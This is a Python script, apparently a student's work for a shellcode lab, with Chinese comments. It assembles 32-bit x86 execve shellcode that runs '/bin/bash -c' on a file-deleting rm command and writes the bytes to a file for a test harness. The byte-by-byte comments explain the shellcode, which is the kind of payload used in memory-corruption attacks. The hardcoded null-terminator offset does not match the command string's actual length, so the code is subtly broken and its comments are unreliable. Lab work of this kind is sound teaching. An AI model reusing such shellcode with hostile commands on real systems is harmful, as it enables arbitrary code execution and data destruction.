#!/usr/bin/python3
import sys

# Task 1: 编写shellcode并验证执行
# 这个shellcode使用execve系统调用来执行指定的命令

# 32位x86汇编代码，用于执行execve系统调用
# 这段代码的详细解释：
shellcode = (
   # 第一部分：跳转和获取地址
   "\xeb\x29"      # jmp 0x2b - 跳转到字符串位置
   "\x5b"          # pop ebx - 将字符串地址弹出到ebx寄存器
   
   # 第二部分：设置参数
   "\x31\xc0"      # xor eax, eax - 将eax寄存器清零
   "\x88\x43\x09"  # mov [ebx+0x9], al - 将字符串中的'*'替换为0
   "\x88\x43\x0c"  # mov [ebx+0xc], al - 将字符串中的'*'替换为0
   "\x88\x43\x47"  # mov [ebx+0x47], al - 将字符串中的'*'替换为0
   
   # 第三部分：设置argv数组
   "\x89\x5b\x48"  # mov [ebx+0x48], ebx - argv[0] = "/bin/bash"的地址
   "\x8d\x4b\x0a"  # lea ecx, [ebx+0xa] - ecx = "-c"的地址
   "\x89\x4b\x4c"  # mov [ebx+0x4c], ecx - argv[1] = "-c"的地址
   "\x8d\x4b\x0d"  # lea ecx, [ebx+0xd] - ecx = 命令字符串的地址
   "\x89\x4b\x50"  # mov [ebx+0x50], ecx - argv[2] = 命令字符串的地址
   "\x89\x43\x54"  # mov [ebx+0x54], eax - argv[3] = NULL (eax=0)
   
   # 第四部分：准备系统调用
   "\x8d\x4b\x48"  # lea ecx, [ebx+0x48] - ecx = argv数组的地址
   "\x31\xd2"      # xor edx, edx - edx = 0 (环境变量为NULL)
   "\x31\xc0"      # xor eax, eax - eax = 0
   "\xb0\x0b"      # mov al, 0xb - eax = 11 (execve系统调用号)
   "\xcd\x80"      # int 0x80 - 执行系统调用
   
   # 第五部分：跳转回开始位置
   "\xe8\xd2\xff\xff\xff"  # call 0x0 - 调用开始位置
   
   # 第六部分：字符串数据
   "/bin/bash*"    # 程序路径，*会被替换为0
   "-c*"           # 参数，*会被替换为0
   
   # 命令字符串 - 修改为删除文件命令
   # 注意：*标记了字符串结束位置，会被shellcode替换为0
   # 删除一个测试文件，并显示删除结果
   "/bin/rm -f /tmp/test_file.txt; echo deleted successfully*"
   
   # 占位符 - 这些会被shellcode替换为实际的地址
   "AAAA"   # 占位符，将被替换为argv[0]的地址
   "BBBB"   # 占位符，将被替换为argv[1]的地址  
   "CCCC"   # 占位符，将被替换为argv[2]的地址
   "DDDD"   # 占位符，将被替换为argv[3]的地址(NULL)
).encode('latin-1')

# 创建一个200字节的缓冲区来存储shellcode
content = bytearray(200)
# 将shellcode复制到缓冲区开头
content[0:] = shellcode

# 将shellcode保存到文件中，供call_shellcode.c使用
with open('codefile_32', 'wb') as f:
  f.write(content)

print("Shellcode已生成并保存到 codefile_32")
print("使用以下命令验证shellcode:")
print("make && ./a32.out")
